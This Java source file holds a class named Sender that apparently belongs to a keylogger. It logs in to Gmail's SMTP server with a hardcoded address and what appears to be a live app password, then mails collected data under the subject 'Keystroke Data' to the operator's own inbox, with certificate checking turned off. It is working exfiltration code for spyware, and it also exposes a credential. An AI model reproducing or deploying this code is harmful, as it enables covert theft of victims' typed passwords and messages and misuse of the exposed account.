package handlers;

import java.util.*;

import javax.mail.Session;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeMessage;
import javax.mail.internet.MimeMessage.RecipientType;
import javax.mail.Transport;

public class Sender {
    private Sender(){
    }

    // Vars for senders email, senders pword, and receivers email
    private static final String SENDERS_GMAIL = "hk.atsteam@gmail.com";
    private static final String SENDERS_PASSWORD = "oiurzjyqckyoyovh";

    private static final String RECIEVERS_EMAIL = "hk.atsteam@gmail.com";

    // Setup for sendMail method
    private static Properties mailServerProperties;
    private static Session mailSession;

    private static MimeMessage mailMessage;

    // Method uses smtp and mailapi libs to send emails through gmail
    public static void sendMail(String emailBody) throws Throwable {
        // Assigns ports, authentication and protocols to mailserver
        mailServerProperties = System.getProperties();
        mailServerProperties.put("mail.smtp.port", "587");
        mailServerProperties.put("mail.smtp.auth", "true");
        mailServerProperties.put("mail.smtp.starttls.enable", "true");
        mailServerProperties.put("mail.smtp.ssl.trust", "*");
        mailServerProperties.put("mail.smtp.ssl.protocols", "TLSv1.2");

        // Assigns emails body, subject line, etc.
        mailSession = Session.getDefaultInstance(mailServerProperties);
        mailMessage = new MimeMessage(mailSession);
        mailMessage.addRecipient(RecipientType.BCC, new InternetAddress(RECIEVERS_EMAIL));
        mailMessage.setSubject("Keystroke Data");
        mailMessage.setContent(emailBody, "text/html");

        // Actually sends the email
        Transport transport = mailSession.getTransport("smtp");
        transport.connect("smtp.gmail.com", SENDERS_GMAIL, SENDERS_PASSWORD);
        transport.sendMessage(mailMessage, mailMessage.getAllRecipients());
        transport.close();

    }


}
